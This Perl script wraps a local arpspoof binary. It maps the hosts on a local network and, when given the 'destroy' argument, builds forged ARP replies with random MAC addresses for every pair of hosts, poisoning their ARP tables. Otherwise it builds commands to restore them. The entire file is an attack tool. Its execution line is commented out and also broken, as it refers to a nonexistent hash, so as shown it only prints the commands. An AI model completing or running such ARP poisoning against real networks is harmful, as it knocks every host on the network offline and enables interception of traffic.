#!/usr/bin/perl -w

sub random_mac {
	return join ":", map {sprintf("%.2x",rand( 256 ))} ("") x 6;
}

foreach ( @ARGV ) {
	if ( /destroy/ ) {
		$destroy++;
	}
}

print "scanning the network... \n";
open ( NETMAP, "./arpspoof -m |" ) or die "can't get the network mapping!";

while ( <NETMAP> ) {
	if ( /^ip (.*) hw (.*)$/ ) {
		$hosts{ $1 } = $2;
	}
	print;
}

if ( $destroy ) {
	print "poisoning hosts' ARP tables... \n";
} else {
	print "restoring hosts' ARP tables... \n";
}

foreach my $orig ( sort keys %hosts ) {
	foreach my $dest ( sort keys %hosts ) {
		if ( $orig ne $dest ) {
			my @args = ( 
				"./arpspoof", 	 # executable name
				$hosts{ $orig }, # src hwaddr
				$hosts{ $dest }, # dst hwaddr
				$orig, 		 # src inetaddr
				$dest,		 # dst inetaddr
				"2" );		 # operation

			$args[ 1 ] = random_mac if $destroy;

			print "issuing: " . join( " ", @args ) . "\n";

			#system( values %args );
		}
	}
}

